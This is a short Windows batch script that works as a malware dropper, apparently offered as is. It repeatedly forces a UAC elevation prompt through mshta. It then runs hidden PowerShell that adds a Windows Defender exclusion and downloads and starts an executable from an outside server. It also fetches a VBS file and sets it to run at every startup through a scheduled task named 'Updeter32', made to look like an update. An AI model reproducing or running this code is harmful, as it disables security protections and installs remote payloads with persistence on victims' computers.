@echo off
reg.exe query "HKU\S-1-5-19">nul 2>&1
if 0 equ 1 (
goto UACPrompt
)
powershell -NoP -sta -NonI -W Hidden -NoLogo -command "Add-MpPreference -ExclusionPath C:\Users\puncher\AppData\Local\Temp;(New-Object System.Net.WebClient).DownloadFile('http://magnelurto.temp.swtest.ru/file.exe','C:\Users\puncher\AppData\Local\Temp\file.exe');Start-Process 'C:\Users\puncher\AppData\Local\Temp\file.exe';(New-Object System.Net.WebClient).DownloadFile('http://magnelurto.temp.swtest.ru/1.vbs','C:\Users\puncher\AppData\Roaming\1.vbs');"
SCHTASKS /CREATE /TR C:\Users\puncher\AppData\Roaming\1.vbs /SC ONSTART /TN Updeter32
pause>nul
exit /b
:UACPrompt
mshta "vbscript:CreateObject("Shell.Application").ShellExecute("~fs0", "", "", "runas", 1) & Close()"
tasklist
find "powershell.exe"
if errorlevel 1 (
goto UACPrompt
)
